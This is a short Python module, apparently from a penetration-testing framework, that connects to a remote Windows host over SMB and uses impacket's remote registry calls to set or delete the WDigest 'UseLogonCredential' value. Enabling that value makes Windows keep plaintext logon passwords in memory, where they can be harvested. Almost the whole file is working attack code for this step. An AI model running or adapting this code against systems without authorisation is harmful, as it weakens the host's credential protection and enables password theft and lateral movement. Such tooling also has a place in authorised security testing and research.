from core.remoteoperations import RemoteOperations
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp

class WDIGEST:

    def __init__(self, logger, smbconnection):
        self.logger = logger
        self.smbconnection = smbconnection
        self.doKerb = False
        self.rrp = None

    def enable(self):
        remoteOps = RemoteOperations(self.smbconnection, self.doKerb)
        remoteOps.enableRegistry()
        self.rrp = remoteOps._RemoteOperations__rrp

        if self.rrp is not None:
            ans = rrp.hOpenLocalMachine(self.rrp)
            regHandle = ans['phKey']

            ans = rrp.hBaseRegOpenKey(self.rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
            keyHandle = ans['phkResult']

            rrp.hBaseRegSetValue(self.rrp, keyHandle, 'UseLogonCredential\x00',  rrp.REG_DWORD, '\x01\x00')

            rtype, data = rrp.hBaseRegQueryValue(self.rrp, keyHandle, 'UseLogonCredential\x00')

            if int(data) == 1:
                self.logger.success('UseLogonCredential registry key created successfully')

        try:
            remoteOps.finish()
        except:
            pass

    def disable(self):
        remoteOps = RemoteOperations(self.smbconnection, self.doKerb)
        remoteOps.enableRegistry()
        self.rrp = remoteOps._RemoteOperations__rrp

        if self.rrp is not None:
            ans = rrp.hOpenLocalMachine(self.rrp)
            regHandle = ans['phKey']

            ans = rrp.hBaseRegOpenKey(self.rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
            keyHandle = ans['phkResult']

            rrp.hBaseRegDeleteValue(self.rrp, keyHandle, 'UseLogonCredential\x00')

            try:
                #Check to make sure the reg key is actually deleted
                rtype, data = rrp.hBaseRegQueryValue(self.rrp, keyHandle, 'UseLogonCredential\x00')
            except DCERPCException:
                self.logger.success('UseLogonCredential registry key deleted successfully')

        try:
            remoteOps.finish()
        except:
            pass